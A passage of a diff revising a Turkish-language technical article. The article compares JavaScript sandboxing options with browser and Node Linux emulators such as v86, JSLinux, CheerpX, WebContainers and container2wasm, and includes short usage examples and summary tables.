+**Takas**: Deno güvenlik modeli kısmen güvenebileceğin kod için mükemmeldir. Düşmanca olabilecek tamamen güvenilmez kod için izin modeli yardım etmez: Isolate sınırına (`isolated-vm`) ya da farklı motora (`quickjs-emscripten`) ihtiyacın vardır çünkü Deno yine V8 kullanır ve sofistike saldırganlar V8 seviyesi hatalar bulabilir.
 
 ---
 
-### 1.6 TC39 ShadowRealm -- standart cevap (nihayet)
+### 1.6 TC39 ShadowRealm: standart yanıt (bir gün)
 
-JavaScript standart organı (TC39), ShadowRealm adında bir teklife sahiptir ve `vm` ve `vm2`'nin yapmaya çalıştığını, ancak doğru bir güvenlik modeliyle standartlaştırmayı amaçlar. Bir ShadowRealm, kendi içselleri olan, dış realm'e erişimi olmayan ve dikkatlice kontrol edilmiş bir import/export arayüzüne sahip izole bir JS yürütme context'i oluşturur.
+JavaScript standart kuruluşunun (TC39) `vm` ve `vm2`nin yapmaya çalıştığını ama doğru güvenlik modeliyle standartlaştırmaya çalışan bir önerisi vardır: ShadowRealm. ShadowRealm kendi içselleriyle izole JS yürütme bağlamı yaratır, dış dünyaya erişim yok ve dikkatle kontrol edilmiş içe/dışa aktarma arayüzü.
 
 ```js
 const realm = new ShadowRealm();
 const result = realm.evaluate(`
-  // Ayrı içseller, dış realm'e erişim yok
+  // Ayrı içseller, dış dünyaya erişim yok
   typeof globalThis.fetch // "undefined"
   6 * 7 // 42
 `);
 ```
 
-ShadowRealm, tarayıcılarda (Chrome 90+, Firefox 105+) mevcuttur ancak 2026 itibarıyla henüz kararlı Node.js'de yoktur. TC39 Compartments teklifi, modül seviyesinde izolasyon için bunun üzerine inşa edilir. Bunlar uzun vadeli standartlaştırılmış cevaplardır, ancak henüz sunucu tarafı Node kullanım durumları için production-ready değildir. Uzaktan geldiğini gördüğün ama henüz... orada olmayan şeylerden biri işte. Klasik TC39 xD
+ShadowRealm tarayıcılarda mevcuttur (Chrome 90+, Firefox 105+) ama 2026da henüz kararlı Node.js içinde değildir. TC39 Compartments önerisi modül seviyesi izolasyon için üstüne inşa edilir. Bunlar uzun vadeli standart yanıtlardır ama Node sunucu tarafı üretim için hazır değildir. Uzaktan geldiğini gördüğün ama... henüz orada olmayan işlerden. Klasik TC39.
 
 ---
 
-### Sandbox ailesi özeti
+### Kum havuzu ailesinin özeti
 
 | | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
 |---|---|---|---|---|---|
-| **İzolasyon sınırı** | yok (sadece kapsam) | Proxy (kırık) | V8 Isolate | Wasm | V8 Isolate + Rust izinleri |
-| **Bellek sınırı** | ❌ | ❌ | ✅ sert limit | ✅ Wasm heap | kısmi |
-| **CPU zaman aşımı** | ❌ | ✅ (bypass edilebilir) | ✅ sert | ✅ | ✅ |
-| **Güvenlik** | yok | kırık | güçlü | güçlü | güçlü |
+| **İzolasyon sınırı** | yok (kapsam) | Proxy (kırık) | V8 Isolate | Wasm | V8 Isolate + Rust izinleri |
+| **Bellek limiti** | ❌ | ❌ | ✅ sıkı limit | ✅ Wasm yığını | kısmi |
+| **CPU zaman aşımı** | ❌ | ✅ (atlatılabilir) | ✅ sıkı | ✅ | ✅ |
+| **Güvenlik** | hiç | kırık | sağlam | sağlam | sağlam |
 | **JS hızı** | yerel V8 | yerel V8 | yerel V8 | ~10x yavaş | yerel V8 |
 | **Tarayıcı** | ❌ | ❌ | ❌ | ✅ | ❌ |
-| **Node uyumu** | yerel | ✅ | ✅ | kısmi shim'ler | kısmi |
-| **Durum** | kararlı | riskli (yeni CVE'ler) | ✅ aktif | ✅ aktif | ✅ aktif |
-| **RAM ek yükü** | ~1 MB | ~5–20 MB | ~3–10 MB | ~5–15 MB | ~10–30 MB |
+| **Node uyumluluğu** | yerel | ✅ | ✅ | kısmi shimler | kısmi |
+| **Durum** | kararlı | riskli (yeni CVEler) | ✅ aktif | ✅ aktif | ✅ aktif |
+| **RAM ek yükü** | ~1 MB | ~5-20 MB | ~3-10 MB | ~5-15 MB | ~10-30 MB |
 
-Çıkarım: güvenlik senin için önemliyse, tam olarak iki gerçek seçenek vardır -- `isolated-vm` (yerel eklenti, V8 Isolate, tam JS hızı) ve `quickjs-emscripten` (Wasm, tarayıcı uyumlu, hesaplama ağır kod için ~10x yavaş). Diğer her şey ya "lütfen yapma" (`vm`, `vm2`) ya da tamamen farklı bir problemi çözen bir çalışma zamanıdır (Deno). ShadowRealm sonunda bu resmi değiştirebilir, ama henüz orada değil.
+Hüküm: güvenlik önemliyse tam iki gerçek seçenek vardır: `isolated-vm` (yerel uzantı, V8 Isolate, tam JS hızı) ve `quickjs-emscripten` (Wasm, tarayıcı uyumlu, yoğun hesapta ~10x yavaş). Geri kalan ya "lütfen yapma" (`vm`, `vm2`) ya tamamen farklı problemi çözen runtime (Deno)dır. ShadowRealm bir gün oyunu değiştirebilir ama henüz değil.
 
 ---
 
-## Bölüm 2 -- JavaScript'te Linux emülatörleri
+## Kısım 2: JavaScript içinde Linux emülatörleri
 
-İşte işlerin benim için gerçekten ilginçleştiği yer. Bunlar *gerçek* emülatörlerdir -- bir CPU komut setini JavaScript veya WebAssembly'de uygularlar, gerçek bir Linux çekirdek imajını başlatırlar ve gerçek kullanıcı alanı ikili dosyalarını çalıştırırlar. İzolasyon, misafir ve ana makinenin hiçbir şey paylaşmamasından gelir: farklı bellek alanları, farklı komut akışları.
+Burası benim için işlerin gerçekten ilginçleştiği yer. Bunlar *gerçek* emülatörlerdir: CPU komut kümesini JavaScript ya da WebAssembly ile uygular, gerçek Linux çekirdek imajı başlatır ve gerçek kullanıcı alanı ikilileri çalıştırır. İzolasyon misafir ve ananın hiçbir şeyi paylaşmamasından gelir: farklı bellek alanları, farklı komut akışları.
 
-Ödediğin bedel çok büyüktür, ama elde ettiğin şey gerçekten dikkat çekicidir: gerçek Linux, gerçekten çalışıyor, tarayıcında veya Node sürecinde. Yani, bunu düşününce oldukça çılgınca, değil mi?
+Fiyatı devasadır ama elde ettiğin gerçekten kayda değerdir: gerçekten Linux, gerçekten döner, tarayıcında ya da Node sürecinde. Yani düşününce epey çılgınca, değil mi?
 
-### 2.1 `v86` -- JS + Wasm JIT'te x86 PC emülatörü
+### 2.1 `v86`: JS + Wasm JITli x86 PC emülatörü
 
-Fabrice (GitHub'da copy) tarafından yapılan `v86`, JavaScript'teki en yetenekli açık kaynak x86 emülatörüdür. 2013 civarında saf bir JS yorumlayıcı olarak başladı ve x86 temel bloklarının anında WebAssembly'e çevrildiği, performansı çarpıcı biçimde artıran bir JIT derlenmiş sisteme dönüştü.
+Fabrice imzasıyla `v86` (GitHubda copy) JavaScriptteki en yetenekli açık kaynak x86 emülatörüdür. 2013 civarı saf JS yorumlayıcı başladı ve x86 temel bloklarının anında WebAssemblye çevrildiği JIT sistemine evrildi, performansı önemli artırdı.
 
-Emule ettiği şeyler:
-- **CPU**: x86-32 (IA-32), komut seti kabaca Pentium 1 seviyesinde. 64-bit (x86-64) desteği yok -- bu, eksik bir özellik değil, sert bir mimari sınırdır.
-- **FPU**: JavaScript'in `Float64Array`'i aracılığıyla. x87 80-bit genişletilmiş hassasiyettir; JS double'ları 64-bit'tir. Bu, kayan nokta sonuçlarının gerçek bir CPU'dan biraz farklı olabileceği anlamına gelir.
-- **Bellek**: yapılandırılabilir, JS heap'inde bir `SharedArrayBuffer` veya `ArrayBuffer`'a eşlenir.
-- **Donanım**: 8254 PIT (zamanlayıcı), 8259 PIC (kesme denetleyicisi), 8042 klavye denetleyicisi (PS/2), CMOS RTC, SVGA uzantılı ve Bochs VBE'li VGA, IDE denetleyicisi, disket denetleyicisi (8272A), NE2000 ağ kartı.
+Öykündüğü şeyler:
+- **CPU**: x86-32 (IA-32), Pentium 1 seviyesi komut kümesi. 64-bit (x86-64) hariçtir: bu donanımsal mimari limittir, eksik özellik değil.
+- **FPU**: JavaScript `Float64Array` üzerinden. x87 80-bit geniş hassasiyettir; JS doubleları 64-bittir. Yani kayan nokta sonuçları gerçek CPUdan hafif farklı olabilir.
+- **Bellek**: yapılandırılabilir, JS yığınında `SharedArrayBuffer` ya da `ArrayBuffer`a eşlenir.
+- **Donanım**: 8254 PIT (zamanlayıcı), 8259 PIC (kesme denetleyici), 8042 klavye denetleyici (PS/2), CMOS RTC, SVGA ve Bochs VBE uzantılı VGA, IDE denetleyici, disket denetleyici (8272A), NE2000 ağ kartı.
 - **BIOS**: SeaBIOS (açık kaynak x86 BIOS) kullanır.
 
-JIT, temel blokları (sıçramasız x86 komut dizileri) belirleyerek, bunları bir WebAssembly fonksiyonuna çevirerek, bu fonksiyonu önbelleğe alarak ve aynı bloğun sonraki çalıştırmalarında çağırarak çalışır. Sıcak kod yolları yerel Wasm performansı alır. Soğuk yollar JS yorumlayıcısına düşer.
+JIT, temel blokları (dalsız x86 komut dizileri) tanımlayıp WebAssembly fonksiyonuna çevirip önbelleğe alıp sonraki yürütmelerde aynı bloğu çağırarak çalışır. Sıcak kod yolları yerel Wasm performansı alır. Soğuk yollar JS yorumlayıcıya düşer.
 
 ```js
 import { V86 } from "v86";
@@ -307,72 +307,72 @@ const emulator = new V86({
   autostart: true,
 });
 
-// Seri port çıktısını yakala (Linux çekirdek konsolu)
+// Seri çıktıyı yakala (Linux çekirdek konsolu)
 emulator.add_listener("serial0-output-byte", byte => {
   process.stdout.write(String.fromCharCode(byte));
 });
 
-// Misafire girdi gönder (shell'e yaz)
+// Misafire girdi gönder (kabuğa yaz)
 emulator.serial0_send("ls /\n");
 ```
 
-**Desteklenen işletim sistemleri**: Alpine Linux (mükemmel), Ubuntu 16.04/18.04 (sadece i386), Arch Linux 32, ReactOS, FreeDOS, Windows 9x/2000 (kısıtlamalarla), MS-DOS.
+**Desteklenen işletim sistemleri**: Alpine Linux (mükemmel), Ubuntu 16.04/18.04 (yalnızca i386), 32-bit Arch Linux, ReactOS, FreeDOS, Windows 9x/2000 (çekincelerle), MS-DOS.
 
-**Başlatma süresi**: Temiz bir imajdan Alpine Linux için 15–40 saniye. Bu, gerçek çekirdek başlatmanın doğasında vardır -- atlayamazsın. Evet, kullanıcıların tarayıcılarında bir çekirdek başlatma dizisini izleyerek oturacaklar. İşte anlaşma bu xD
+**Başlatma süresi**: temiz imajdan Alpine Linux için 15-40 saniye. Bu gerçek çekirdek başlatmaya içkindir: atlayamazsın. Evet, kullanıcıların tarayıcılarında Linux çekirdeği başlatmasını izleyecek. Anlaşma bu.
 
-**Bellek tabanı**: örnek başına 100–256 MB. Yoğun bir Linux örneği için Wasm JIT kod önbelleği tek başına onlarca MB'a ulaşabilir.
+**Minimum bellek**: örnek başına 100-256 MB. Yalnızca Wasm JIT kod önbelleği meşgul Linux örneği için onlarca MBa ulaşabilir.
 
-**Node.js kullanımı**: tam desteklenir. DOM gerekmez -- sadece seri portu önemsiyorsan VGA çıktısı atılabilir.
+**Node.js içinde kullanım**: tam desteklenir. Yalnızca seri çıktıyla ilgileniyorsan VGA çıktısı yoksayılabilir: DOM gereksiz kalır.
 
-**Yapamayacağın şeyler**: 64-bit ikili dosyalar çalıştıramazsın, modern çekirdek özelliklerini (eBPF, io_uring vb.) kullanamazsın veya bellek limitlerine çarpmadan aynı anda bir avuçtan fazla örnek çalıştıramazsın.
+**Yapamayacağın şeyler**: 64-bit ikililer çalıştırmak, modern çekirdek özellikleri (eBPF, io_uring vs.) kullanmak ya da bellek limitlerine ulaşmadan aynı anda bir avuçtan fazla örnek çalıştırmak.
 
-**npm**: [v86](https://www.npmjs.com/package/v86) -- sürekli güncellenir, bu yazının yazıldığı an son yayınlanan sürüm son bir gün içinde.  
-**GitHub**: [copy/v86](https://github.com/copy/v86)  
+**npm**: [v86](https://www.npmjs.com/package/v86): sürekli güncellenir, yazarken son yayın aynı gün.
+**GitHub**: [copy/v86](https://github.com/copy/v86)
 **Demo**: [copy.sh/v86](https://copy.sh/v86)
 
 ---
 
-### 2.2 JSLinux ve TinyEMU -- Bellard'ın işi, iki kere
+### 2.2 JSLinux ve TinyEMU: Bellard işi, iki seferde
 
-JSLinux, Fabrice Bellard'ın kendi JavaScript Linux emülatörüdür -- 2011'de yayınlanan ilk örnek. Bu makalede Bellard'dan bahsedip duruyorum çünkü karşıma çıkmaya devam ediyor: QuickJS, TinyEMU, JSLinux, QEMU, FFmpeg. Adam başka bir şey. Gerçekten, abartısız, yazılım tarihindeki en etkileyici bireysel teknik katkılardan biri.
+JSLinux, Fabrice Bellardın JavaScript içinde kendi Linux emülatörüdür: ilki, 2011de yayınlandı. Bu makalede Bellardı anmaya devam ederim çünkü belirmeye devam eder: QuickJS, TinyEMU, JSLinux, QEMU, FFmpeg. Bu adam başka bir şeydir. Abartısız yazılım tarihinin en etkileyici bireysel teknik katkılarından biri. Gerçekten.
 
-Orijinal JSLinux saf bir JS x86 yorumlayıcıydı. 2016'da Bellard, TinyEMU'yu (C ile yazılmış bir RISC-V emülatörü) yazdı, onu Emscripten aracılığıyla JavaScript'e derledi ve bu, mevcut JSLinux'un temeli oldu. Yani mevcut JSLinux aslında JavaScript üreten C kodudur -- elle yazılmış JS değil.
+Orijinal JSLinux saf JS x86 yorumlayıcıydı. 2016da Bellard TinyEMuyu yazdı (C ile RISC-V emülatörü), Emscripten ile JavaScript derledi ve bu mevcut JSLinuxun tabanı oldu. Yani mevcut JSLinux aslında JavaScript üreten C kodudur: elle yazılmış JS hiç değildir.
 
-Bellard'ın sitesindeki teknik notlar okumaya değer: mevcut JSLinux, VirtIO konsol, VirtIO ağ, VirtIO blok aygıtı ve ana makineyle dosya paylaşımı için bir 9P dosya sistemini emule eden 32 veya 64-bit bir RISC-V CPU (x86 değil) çalıştırır. JS demosu, Emscripten kullanılarak C'den derlenmiştir -- elle yazılmış JS değil.
+Bellard sitesindeki teknik notlar okumaya değer: mevcut JSLinux 32 ya da 64-bit RISC-V CPU (x86 değil) çalıştırır, VirtIO konsol, VirtIO ağ, VirtIO blok cihazı ve ana ile dosya paylaşımı için 9P dosya sistemi öykünür. JS demosu Emscripten kullanılarak Cden derlenir: elle yazılmış JS değildir.
 
-TinyEMU'nun kendisi şunları destekler:
-- RISC-V RV32IMAFDQC ve RV64IMAFDQC (32 ve 64-bit, float, çarpma, sıkıştırılmış komutlarla)
-- KVM aracılığıyla x86 (sadece yerel, emülasyon yok -- yani JS sürümü sadece RISC-V)
+TinyEMUnun kendisi şunları destekler:
+- RISC-V RV32IMAFDQC ve RV64IMAFDQC (32 ve 64-bit, kayan nokta, çarpma, sıkıştırılmış komutlarla)
+- KVM üzerinden x86 (yalnızca yerel, emülasyon yok: yani JS sürümü yalnızca RISC-Vdir)
 - VirtIO konsol, ağ, blok, girdi, 9P dosya sistemi
 
-TinyEMU, Emscripten aracılığıyla sağlanan bir JavaScript demosuna sahiptir. JSLinux'un temelidir ve ayrıca `container2wasm` tarafından da kullanılır (bkz. bölüm 2.5).
+TinyEMUnun Emscripten ile sağlanan JavaScript demosu vardır. Bu JSLinuxun tabanıdır ve `container2wasm` tarafından da kullanılır (bölüm 2.5e bak).
 
-**JSLinux durumu**: npm paketi yok, programatik API yok. Tarayıcında açtığın bir demo. Tarihsel önemi yüksektir -- konsepti kanıtladı. Kütüphane olarak pratik kullanımı: yok.
+**JSLinux durumu**: npm paketi yok, programlanabilir API yok. Tarayıcıda açtığın bir demodur. Tarihsel önemi büyüktür: kavramı kanıtladı. Kütüphane olarak pratik fayda: sıfır.
 
-**TinyEMU**: npm'de yok, C kaynağı [bellard.org/tinyemu](https://bellard.org/tinyemu/) adresinde.
-
----
-
-### 2.3 jor1k -- OR1K emülatörü
-
-jor1k, Sebastian Macke tarafından JavaScript ile yazılmış bir OpenRISC 1000 (OR1K) emülatörüdür. Tarihsel olarak ilginçtir çünkü jor1k, VirtIO 9P dosya sistemi desteğini tanıttı ve Bellard daha sonra bunu TinyEMU ve JSLinux'a dahil etti. Bu projeler arasındaki çapraz tozlaşma sıkıdır -- hepsi birbirinden ödünç alır, ki bu açık kaynak emülasyon çalışmalarıyla ilgili en havalı şeylerden biridir.
-
-**Durum**: artık aktif olarak bakılmıyor, npm paketi yok. Bu noktada arşivlenmiş durumda. Çoğunlukla tarihsel bağlam için bilmekte fayda var -- yani birisi sohbette jor1k'ten bahsederse, artık ne olduğunu biliyorsun :)
+**TinyEMU**: npmde yok, C kaynağı [bellard.org/tinyemu](https://bellard.org/tinyemu/) adresinde mevcuttur.
 
 ---
 
-### 2.4 CheerpX -- tarayıcı için ticari x86 emülatörü
+### 2.3 jor1k: OR1K emülatörü
 
-Leaning Technologies tarafından yapılan CheerpX, ticari, production kalitesinde bir x86 Linux emülatörüdür. Açık kaynak değildir, ancak gerçek Debian/Ubuntu kullanıcı alanını çalıştırmak için v86'dan önemli ölçüde daha yeteneklidir. Tarayıcıda gerçek VSCode'a ihtiyacın varsa, uzanacağın şey budur.
+jor1k, Sebastian Macke tarafından JavaScript yazılmış OpenRISC 1000 (OR1K) emülatörüdür. Tarihsel ilginçtir çünkü jor1k VirtIO 9P dosya sistemi desteğini getirdi, Bellard sonra TinyEMU ve JSLinuxa entegre etti. Bu projeler arası çapraz tozlaşma sıkıdır: hepsi birbirinden fikir ödünç alır, dürüstçe açık kaynak öykünme işinin en havalı şeylerinden biridir.
 
-v86'dan temel farklar:
-- Daha geniş bir ISA'yı destekler (daha fazla x86 uzantısı, daha iyi glibc uyumluluğu)
-- Tarayıcıda IndexedDB destekli dosya sistemi (sayfa yüklemeleri arasında kalıcı)
-- `SharedArrayBuffer` aracılığıyla pthread desteği (COOP/COEP başlıkları gerektirir -- evet o sinir bozucu güvenlik başlıkları)
-- Sadece minimal işletim sistemi imajları değil, VSCode, Python, Node.js ve diğer gerçek uygulamaları çalıştırmak için tasarlanmıştır
-- Profesyonel destek ve SLA mevcuttur
+**Durum**: artık aktif bakımlı değil, npm paketi yok. Bu aşamada arşivlenmiş. Esas tarihsel bağlam için bilinmeye değer: türü sohbette biri jor1k anarsa artık ne olduğunu bilirsin :)
 
-Tipik kullanım durumu, "bir sunucu olmadan tarayıcıda gerçek bir Linux uygulaması çalıştırmak"tır. Şirketler bunu tarayıcı tabanlı IDE'ler, kodlama eğitimleri ve etkileşimli dokümantasyon için kullanır.
+---
+
+### 2.4 CheerpX: tarayıcı için ticari x86 emülatörü
+
+Leaning Technologies imzalı CheerpX üretim kalitesinde ticari Linux x86 emülatörüdür. Açık kaynak değildir ama gerçek Debian/Ubuntu kullanıcı alanını çalıştırmak için v86dan belirgin yeteneklidir. Tarayıcıda gerçek VSCodea ihtiyacın varsa ihtiyacın olan budur.
+
+v86dan kilit farklar:
+- Daha geniş ISA desteği (daha fazla x86 uzantısı, daha iyi glibc uyumluluğu)
+- Tarayıcıda IndexedDB tabanlı dosya sistemi (sayfa yeniden yüklemelerinde kalıcı)
+- `SharedArrayBuffer` üzerinden pthread desteği (COOP/COEP başlıkları gerektirir: evet o sinir bozucu güvenlik başlıkları)
+- VSCode, Python, Node.js ve diğer gerçek uygulamaları çalıştırmak için tasarlanmış: minimal işletim sistemi imajları değil
+- Profesyonel destek ve SLA mevcut (aka bozulursa birine çıkışabilirsin)
+
+Tipik kullanım durumu "sunucusuz tarayıcıda gerçek Linux uygulaması çalıştırmak"tır. Şirketler tarayıcı tabanlı IDEler, kodlama öğreticileri ve etkileşimli belgeleme için kullanır.
 
 ```js
 // CheerpX API (basitleştirilmiş)
@@ -382,108 +382,108 @@ const cx = await CheerpX.Linux.create({
 await cx.run("/bin/bash");
 ```
 
-**Node.js hikayesi**: CheerpX öncelikle tarayıcı içindir. Alttaki emülatör teoride Node'da çalışabilir (Wasm), ancak API ve dokümantasyon tamamen tarayıcı kullanımına yöneliktir. Sunucu tarafı kullanımı desteklenmez.
+**Node.js hikâyesi**: CheerpX önce tarayıcı için tasarlanmıştır. Alttaki emülatör teoride Nodeda çalışabilir (Wasm) ama API ve belgeler tamamen tarayıcı kullanımına yöneliktir. Sunucu tarafı kullanım desteklenmez.
 
-**Bellek**: v86'ya benzer -- gerçek bir Debian örneği için 200+ MB.  
-**Fiyatlandırma**: açık kaynak projeler için ücretsiz, production SaaS için ticari lisans.  
-**Doküman**: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)
+**Bellek**: v86 benzeri: gerçek Debian örneği için 200+ MB.
+**Fiyatlandırma**: açık kaynak projeler ücretsiz, üretim SaaS için ticari lisans.
+**Belgeler**: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)
 
 ---
 
-### 2.5 WebContainers (StackBlitz) -- Wasm'de Node.js, Linux emülasyonu değil
+### 2.5 WebContainers (StackBlitz): Wasmde Node.js, Linux öykünmesi değil
 
-WebContainers genellikle Linux emülatörleriyle birlikte anılır ancak mimari olarak farklıdır. x86 emüle etmezler. Linux başlatmazlar. WASI kullanarak WebAssembly'e derlenmiş Node.js çalıştırırlar. Bu ayrım çok önemlidir ve ben de kendim çok uzun süre kafam karışık olarak harcadım lol.
+WebContainerlar sık Linux emülatörleriyle aynı torbaya konur ama mimari farklıdır. x86 öykünmezler. Linux başlatmazlar. WASI kullanarak WebAssemblye derlenmiş Node.js çalıştırırlar. Bu ayrım çok önemlidir ve kafamın karışık olmasıyla fazlaca zaman harcadım.
 
-Bence kafa karışıklığı pazarlamadan geliyor -- "tarayıcında Node.js çalıştır" kulağa emülasyon gibi geliyor, ama aslında bir VM içinde Node.js çalıştıran Linux emülasyonu değil, Wasm'a derlenmiş Node.js'in kendisi. Tamamen farklı bir şey.
+Karışıklığın pazarlamadan geldiğini düşünürüm: "tarayıcında Node.js çalıştır" öykünme gibi duyulur ama aslında Wasme derlenmiş Node.jsin kendisidir, VM içinde Node.js çalıştıran Linux öykünmesi değil. İki tamamen farklı mimari.
 
 Mimari:
-1. Node.js, Wasm'a derlenir (özellikle özel bir WASI çalışma zamanı)
-2. Bir Service Worker, emüle edilen Node.js sunucusundan gelen ağ isteklerini yakalar ve bunları tarayıcı sekmesine yönlendirir
+1. Node.js Wasme derlenir (özel WASI çalışma ortamı)
+2. Service Worker öykünmüş Node.js sunucusunun ağ isteklerini keser ve tarayıcı sekmesine yönlendirir
 3. Dosya sistemi tarayıcı belleğinde yaşar (disk G/Ç yok)
-4. npm, tarayıcı içi kullanım için optimize edilmiş özel bir uygulamadır
+4. npm tarayıcı içi kullanıma optimize özel uygulamadır
 
 ```js
 import { WebContainer } from "@webcontainer/api";
 
 const webcontainer = await WebContainer.boot();
 
-// Dosyaları yaz
+// Dosya yaz
 await webcontainer.mount({
   "index.js": { file: { contents: `console.log("hello")` } },
   "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
 });
 
-// Node.js komutlarını çalıştır
+// Node.js komutları çalıştır
 const proc = await webcontainer.spawn("node", ["index.js"]);
 proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
 ```
 
-Gerçek Node.js (Wasm-derlenmiş) çalıştırdığı için, gerçek npm, gerçek Node.js API'leri ve gerçek modül çözümlemesi alırsın. Genel amaçlı bir Linux kullanıcı alanı almazsın -- `apt` ile sistem paketleri kuramazsın, rastgele derlenmiş ikili dosyaları çalıştıramazsın veya Node.js ekosistemi dışında fazla bir şey yapamazsın.
+Gerçek Node.js çalıştırdığı için (Wasme derlenmiş) gerçek npm, gerçek Node.js APIleri ve gerçek modül çözümlemesi elde edersin. Genel Linux kullanıcı alanı elde etmezsin: `apt` ile sistem paketi kuramaz, keyfi derlenmiş ikililer çalıştıramaz ya da Node.js ekosistemi dışında fazla şey yapamazsın.
 
-**Tarayıcı gereksinimleri**: SharedArrayBuffer (COOP/COEP başlıkları gerektirir), Service Worker desteği, modern Wasm.
+**Tarayıcı önkoşulları**: SharedArrayBuffer (COOP/COEP başlıkları gerektirir), Service Worker desteği, modern Wasm.
 
-**Node.js hikayesi**: sadece tarayıcı kullanımı için tasarlanmıştır. API, tarayıcı context'i dışında çalışmaz.
+**Node.js hikâyesi**: yalnızca tarayıcı kullanımı için tasarlanmış. API tarayıcı bağlamı dışında çalışmaz.
 
-**npm**: [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)  
-**Doküman**: [webcontainers.io](https://webcontainers.io)
+**npm**: [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)
+**Belgeler**: [webcontainers.io](https://webcontainers.io)
 
 ---
 
-### 2.6 container2wasm -- Wasm'a derlenmiş Docker konteynerleri
+### 2.6 container2wasm: Wasme derlenmiş Docker konteynerleri
 
-`container2wasm`, NTT'den bir Docker konteyner imajını alıp herhangi bir Wasm ana bilgisayarında -- bir tarayıcı dahil -- çalışabilen bir WebAssembly ikili dosyasına dönüştüren bir araçtır (npm paketi değil). Bunu ilk gördüğümde gerçekten işe yaradığına inanmamıştım.
+`container2wasm`, NTTnin Docker konteyner imajını alıp tarayıcı dahil herhangi bir Wasm anada dönebilen WebAssembly ikilisine dönüştüren aracıdır (npm paketi değil). İlk gördüğümde gerçekten çalıştığına inanmadım.
 
 Mekanizma:
-- x86_64 konteynerler için: Bochs'u (Wasm'a derlenmiş bir x86 emülatörü) + konteynerin kök dosya sistemini gömer
-- riscv64 konteynerler için: TinyEMU'yu (yine Bellard!) + konteynerin kök dosya sistemini gömer
-- Ortaya çıkan `.wasm` dosyası emülatörü başlatır, konteyner dosya sistemini bağlar ve konteynerin giriş noktasını çalıştırır
+- x86_64 konteynerler için: Bochs (Wasme derlenmiş x86 emülatörü) + konteynerin kök dosya sistemi gömülür
+- riscv64 konteynerler için: TinyEMU (yine Bellard!) + konteynerin kök dosya sistemi gömülür
+- Sonuç `.wasm` dosyası emülatörü başlatır, konteynerin dosya sistemini bağlar ve konteynerin giriş noktasını çalıştırır
 
 ```bash
-# Ubuntu 22.04 konteynerini Wasm'a dönüştür
+# Ubuntu 22.04 konteynerini Wasme dönüştür
 c2w ubuntu:22.04 out.wasm
 
 # Çalıştır
 wasmtime out.wasm uname -a
 # Linux 5.15.0 #1 SMP riscv64 GNU/Linux
 
-# Veya tarayıcı kullanımı için sun
+# Ya da tarayıcı kullanımı için sun
 c2w --to-js ubuntu:22.04 /tmp/htdocs/
 ```
 
-Ortaya çıkan `.wasm` büyüktür -- minimal bir Ubuntu birkaç yüz MB'tır -- ama tamamen kendi kendine yeterlidir. Birine bir `.wasm` e-postayla gönderebilirsin ve onlar tarayıcılarında Ubuntu çalıştırabilir. Bu cümle mantıklı olmamalı ama işte buradayız.
+Sonuç `.wasm` hacimlidir: minimal Ubuntu birkaç yüz MB tutar ama tamamen bağımsızdır. Birine e-postayla `.wasm` gönderip tarayıcısında Ubuntu çalıştırabilir. Bu cümlenin anlamlı olmaması gerekirdi ama işte buradayız.
 
 **GitHub**: [container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)
 
 ---
 
-### Emülatör ailesi özeti
+### Emülatör ailesinin özeti
 
 | | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
 |---|---|---|---|---|---|---|
-| **Mimari** | x86-32 JIT→Wasm | RISC-V (Wasm) | OR1K (JS) | x86 (özel) | Node.js→Wasm/WASI | x86/RISC-V (Wasm) |
+| **Mimari** | x86-32 JIT→Wasm | RISC-V (Wasm) | OR1K (JS) | x86 (sahipli) | Node.js→Wasm/WASI | x86/RISC-V (Wasm) |
 | **Gerçek çekirdek** | ✅ | ✅ | ✅ | ✅ | ❌ (Node.js) | ✅ |
-| **64-bit** | ❌ | ✅ (RISC-V) | ❌ | ✅ | yok | ✅ |
+| **64-bit** | ❌ | ✅ (RISC-V) | ❌ | ✅ | uygulanamaz | ✅ |
 | **npm paketi** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌ (CLI aracı) |
-| **Node.js kullanımı** | ✅ | ❌ | ❌ | ❌ | ❌ (sadece tarayıcı) | Wasmtime ile |
+| **Node.js kullanımı** | ✅ | ❌ | ❌ | ❌ | ❌ (yalnızca tarayıcı) | Wasmtime üzerinden |
 | **Tarayıcı kullanımı** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
-| **RAM/örnek** | 150–256 MB | ~64–128 MB | ~64 MB | 200+ MB | ~100 MB | ~200–500 MB |
-| **Başlatma süresi** | 15–40s | 10–30s | 10–30s | 15–40s | 2–5s | 10–40s |
+| **RAM/örnek** | 150-256 MB | ~64-128 MB | ~64 MB | 200+ MB | ~100 MB | ~200-500 MB |
+| **Başlatma süresi** | 15-40 sn | 10-30 sn | 10-30 sn | 15-40 sn | 2-5 sn | 10-40 sn |
 | **Açık kaynak** | ✅ | ✅ | ✅ | ❌ | kısmi | ✅ |
-| **Durum** | ✅ çok aktif | ✅ kararlı | ⚠️ arşivlenmiş | ✅ ticari | ✅ aktif | ✅ aktif |
+| **Durum** | ✅ çok aktif | ✅ kararlı | ⚠️ arşivli | ✅ ticari | ✅ aktif | ✅ aktif |
 
-Bu tablodan göze çarpan: `v86`, npm paketi olan, hem tarayıcıda hem Node'da çalışan ve açık kaynak olan tek emülatör. Bu yüzden "JavaScript Linux emülatörü" konuşmalarına hakimdir. Diğer her şeyin bir yakalaması vardır -- JSLinux'un API'si yoktur, jor1k arşivlenmiştir, CheerpX para gerektirir, WebContainers sadece tarayıcı ve Node'a özeldir, container2wasm bir derleme adımı ve CLI gerektirir. Sadece "JavaScript'te Linux başlatmak" istiyorsan, `v86` neredeyse her zaman doğru başlangıç noktasıdır.
